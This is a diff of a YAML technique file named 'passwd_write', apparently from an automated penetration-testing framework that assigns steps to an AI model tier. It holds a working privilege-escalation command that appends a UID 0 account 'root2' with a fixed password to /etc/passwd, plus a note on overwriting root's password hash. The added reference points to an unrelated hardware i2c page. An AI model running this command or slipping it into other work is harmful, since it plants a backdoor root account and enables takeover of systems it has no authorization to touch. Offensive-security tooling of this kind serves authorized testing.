@@ -2,15 +2,18 @@ name: passwd_write
 category: privesc
 description: Write to /etc/passwd for root
 preconditions:
-  - os==linux
+- os==linux
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "echo 'root2:$(openssl passwd -6 password):0:0:root:/root:/bin/bash' >> /etc/passwd"
+command_template: echo 'root2:$(openssl passwd -6 password):0:0:root:/root:/bin/bash'
+  >> /etc/passwd
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "If /etc/passwd is writable, add entry with UID 0. Use openssl passwd -6 for SHA-512 hash. Or replace root's password hash directly."
+mechanism: If /etc/passwd is writable, add entry with UID 0. Use openssl passwd -6
+  for SHA-512 hash. Or replace root's password hash directly.
+hacktricks_ref: todo/hardware-hacking/i2c.md
